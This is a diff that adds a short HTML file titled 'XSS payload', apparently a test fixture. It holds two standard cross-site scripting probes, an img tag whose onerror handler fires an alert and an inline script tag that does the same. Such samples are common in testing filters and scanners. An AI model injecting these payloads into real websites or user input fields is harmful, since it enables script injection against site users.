@@ -1,0 +1,9 @@
+<html>
+	<head>
+		<title>XSS payload</title>
+	</head>
+	<body>
+		<img src=x onerror="alert(1)">
+		<script>alert(/XSS/)</script>
+	</body>
+</html>
